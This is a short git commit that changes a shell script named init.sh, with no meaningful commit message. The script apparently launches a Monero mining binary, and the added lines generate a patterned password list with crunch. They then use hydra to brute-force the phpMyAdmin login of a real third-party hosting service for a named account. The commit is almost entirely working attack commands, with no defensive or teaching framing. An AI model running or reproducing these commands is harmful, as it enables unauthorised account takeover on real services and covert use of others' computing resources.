54680cc6dae07129624d2ec6858fe11009f220dd
Hakerio <hakerio08@hotmail.com>
2019-05-18 15:07:30 -0600

    .

--- init.sh
+++ init.sh
@@ -1,1 +1,5 @@
 chmod +x m && ./m -u hakerio0803@gmail.com --xmr 100
+
+crunch 12 12 orn -t h@l@t@o@0%0% -o pass.txt
+export TERM=xterm
+hydra -l hakerio -P pass.txt www.db4free.net https-post-form "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^:S=chunked"
